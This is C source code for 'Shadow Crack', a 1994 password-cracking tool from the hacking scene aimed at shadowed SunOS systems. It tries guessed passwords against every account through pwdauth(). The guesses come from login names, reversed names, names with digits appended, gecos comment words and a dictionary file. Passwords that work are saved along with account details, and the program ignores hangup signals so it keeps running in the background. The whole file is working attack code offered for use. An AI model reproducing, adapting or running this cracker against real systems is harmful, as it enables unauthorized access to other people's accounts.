/* Program   : Shadow Crack
   Author    : (c)1994 The Shining/UPi (UK Division)
   Date      : Released 12/4/94
   Unix type : SUNOS Shadowed systems only */

#include <stdio.h>
#include <getopt.h>
#include <stdlib.h>
#include <pwd.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>

#define WORDSIZE 20     /* Maximum word size */
#define OUTFILE "data"  /* File to store cracked account info */

void word_strat( void ), do_dict( void );
void add_nums( char * ), do_comment( char * );
void try_word( char * ), reverse_word( char * );
void find_mode( void ), burst_mode( void );
void mini_burst( void ), brute_force( void );
void user_info( void ), write_details( char * );
void pwfile_name( void ), disable_interrupts( void ), cleanup();


char *logname, *comment, *homedir, *shell, *dict, *mode,
     *pwfile, *pwdauth();
struct passwd *getpwnam(), *pwentry;
extern char *optarg;
int option, uid, gid;


int main( int argc, char **argv )
{
disable_interrupts();
system("clear");

if (argc < 2) {
printf("Shadow Crack - (c)1994 The Shining\n");
printf("SUNOS Shadow password brute force cracker\n\n");
printf("useage: %s -m[mode] -p[pwfile] -u[loginid] ", argv[0]);
printf("-d[dictfile]\n\n\n");
printf("[b] is burst mode, scans pwfile trying minimum\n");
printf("    password strategies on all i.d's\n\n");
printf("[i] is mini-burst mode, scans pwfile trying both\n");
printf("    userid, gecos info, and numbers to all i.d's\n\n");
printf("[f] is bruteforce mode, tries all above stategies\n");
printf("    as well as dictionary words\n\n");
printf("[pwfile]   Uses the password file [pwfile], default\n");
printf("           is /etc/passwd\n\n");
printf("[loginid]  Account you wish to crack, used with\n");
printf("           -mf bruteforce mode only\n\n");
printf("[dictfile] uses dictionary file [dictfile] to\n");
printf("           generate passwords when used with\n");
printf("           -mf bruteforce mode only\n\n");
exit(0);
}


/* Get options from the command line and store them in different
   variables */

while ((option = getopt(argc, argv, "m:p:u:d:")) != EOF)
 switch(option)
 {
   case 'm':
           mode = optarg;
           break;

   case 'p':
           pwfile = optarg;
           break;

   case 'u':
           logname = optarg;
           break;

   case 'd':
           dict = optarg;
           break;

   default:
           printf("wrong options\n");
           break;
 }

find_mode();
}


/* Routine to redirect interrupts */

void disable_interrupts( void )
{
signal(SIGHUP, SIG_IGN);
 signal(SIGTSTP, cleanup);
  signal(SIGINT, cleanup);
 signal(SIGQUIT, cleanup);
signal(SIGTERM, cleanup);
}


/* If CTRL-Z or CTRL-C is pressed, clean up & quit */

void cleanup( void )
{
FILE *fp;

if ((fp = fopen("gecos", "r")) != NULL)
   remove("gecos");

if ((fp = fopen("data", "r")) == NULL)
   printf("\nNo accounts cracked\n");

printf("Quitting\n");
exit(0);
}


/* Function to decide which mode is being used and call appropriate
   routine */

void find_mode( void )
{
 if (strcmp(mode, "b") == NULL)
    burst_mode();
 else
 if (strcmp(mode, "i") == NULL)
    mini_burst();
 else
 if (strcmp(mode, "f") == NULL)
    brute_force();
 else
  {
    printf("Sorry - No such mode\n");
    exit(0);
  }
}


/* Get a users information from the password file */

void user_info( void )
{
  uid = pwentry->pw_uid;
   gid = pwentry->pw_gid;
    comment = pwentry->pw_gecos;
   homedir = pwentry->pw_dir;
  shell = pwentry->pw_shell;
}



/* Set the filename of the password file to be used, default is
   /etc/passwd */

void pwfile_name( void )
{
if (pwfile != NULL)
    setpwfile(pwfile);
}



/* Burst mode, tries user i.d. & then reverses it as possible passwords
   on every account found in the password file */

void burst_mode( void )
{
pwfile_name();
setpwent();

  while ((pwentry = getpwent()) != (struct passwd *) NULL)
  {
     logname = pwentry->pw_name;
      user_info();
      try_word( logname );
     reverse_word( logname );
  }

endpwent();
}


/* Mini-burst mode, try above combinations as well as other strategies
   which include adding numbers to the end of the user i.d. to generate
   passwords or using the comment field information in the password
   file */

void mini_burst( void )
{
pwfile_name();
setpwent();

  while ((pwentry = getpwent()) != (struct passwd *) NULL)
  {
     logname = pwentry->pw_name;
      user_info();
     word_strat();
  }

endpwent();
}


/* Brute force mode, uses all the above strategies as well using a
   dictionary file to generate possible passwords */

void brute_force( void )
{
pwfile_name();
setpwent();

  if ((pwentry = getpwnam(logname)) == (struct passwd *) NULL) {
     printf("Sorry - User unknown\n");
     exit(0);
  }
  else
  {
     user_info();
      word_strat();
     do_dict();
  }

endpwent();
}


/* Calls the various password guessing strategies */

void word_strat()
{
 try_word( logname );
  reverse_word( logname );
   add_nums( logname );
  do_comment( comment );
}


/* Takes the user name as its argument and then generates possible
   passwords by adding the numbers 0-9 to the end. If the username
   is greater than 7 characters, don't bother */

void add_nums( char *wd )
{
int i;
char temp[2], buff[WORDSIZE];

if (strlen(wd) < 8) {

  for (i = 0; i < 10; i++)
  {
      strcpy(buff, wd);
       sprintf(temp, "%d", i);
        strcat(wd, temp);
       try_word( wd );
      strcpy(wd, buff);
  }

 }
}



/* Gets info from the 'gecos' comment field in the password file,
   then process this information generating possible passwords from it */

void do_comment( char *wd )
{
FILE *fp;

char temp[2], buff[WORDSIZE];
int c,  flag;

flag = 0;


/* Open file & store users gecos information in it. w+ mode
   allows us to write to it & then read from it. */

if ((fp = fopen("gecos", "w+")) == NULL) {
    printf("Error writing gecos info\n");
   exit(0);
}

    fprintf(fp, "%s\n", wd);
   rewind(fp);

strcpy(buff, "");


/* Process users gecos information, separate words by checking for the
   ',' field separater or a space. */

while ((c = fgetc(fp)) != EOF)
{

 if (( c != ',' ) && ( c != ' ' )) {
     sprintf(temp, "%c", c);
    strncat(buff, temp, 1);
 }
 else
    flag = 1;


   if ((isspace(c)) || (c == ',') != NULL) {

     if (flag == 1) {
        c=fgetc(fp);

        if ((isspace(c)) || (iscntrl(c) == NULL))
           ungetc(c, fp);
     }

     try_word(buff);
      reverse_word(buff);
       strcpy(buff, "");
      flag = 0;
     strcpy(temp, "");
   }

}
fclose(fp);
remove("gecos");
}



/* Takes a string of characters as its argument(in this case the login
   i.d., and then reverses it */

void reverse_word( char *wd )
{
char temp[2], buff[WORDSIZE];
int i;

i = strlen(wd) + 1;
 strcpy(temp, "");
strcpy(buff, "");

 do
 {
    i--;
    if ((isalnum(wd[i]) || (ispunct(wd[i]))) != NULL) {
        sprintf(temp, "%c", wd[i]);
       strncat(buff, temp, 1);
    }

 } while(i != 0);

if (strlen(buff) > 1)
   try_word(buff);
}



/* Read one word at a time from the specified dictionary for use
   as possible passwords, if dictionary filename is NULL, ignore
   this operation */

void do_dict( void )
{
FILE *fp;
char buff[WORDSIZE], temp[2];
int c;

strcpy(buff, "");
strcpy(temp, "");


if (dict == NULL)
   exit(0);

   if ((fp = fopen(dict, "r")) == NULL) {
       printf("Error opening dictionary file\n");
      exit(0);
   }

rewind(fp);


 while ((c = fgetc(fp)) != EOF)
 {
  if ((c != ' ') || (c != '\n')) {
     strcpy(temp, "");
      sprintf(temp, "%c", c);
     strncat(buff, temp, 1);
  }

  if (c == '\n') {
    if (buff[0] != ' ')
       try_word(buff);

      strcpy(buff, "");
  }
 }

fclose(fp);
}


/* Process the word to be used as a password by stripping \n from
   it if necessary, then use the pwdauth() function, with the login
   name and word to attempt to get a valid id & password */

void try_word( char pw[] )
{
int pwstat, i, pwlength;
char temp[2], buff[WORDSIZE];

strcpy(buff, "");
pwlength = strlen(pw);

for (i = 0; i != pwlength; i++)
{

 if (pw[i] != '\n') {
     strcpy(temp, "");
     sprintf(temp, "%c", pw[i]);
    strncat(buff, temp, 1);
 }
}

 if (strlen(buff) > 3 ) {
     printf("Trying : %s\n", buff);

     if (pwstat = pwdauth(logname, buff) == NULL) {
         printf("Valid Password! - writing details to 'data'\n");

         write_details(buff);

        if (strcmp(mode, "f") == NULL)
           exit(0);
     }
 }
}



/* If valid account & password, store this, along with the accounts
   uid, gid, comment, homedir & shell in a file called 'data' */

void write_details( char *pw )
{
FILE *fp;

if ((fp = fopen(OUTFILE, "a")) == NULL) {
    printf("Error opening output file\n");
   exit(0);
}

fprintf(fp, "%s:%s:%d:%d:", logname, pw, uid, gid);
 fprintf(fp, "%s:%s:%s\n", comment, homedir, shell);
fclose(fp);
}
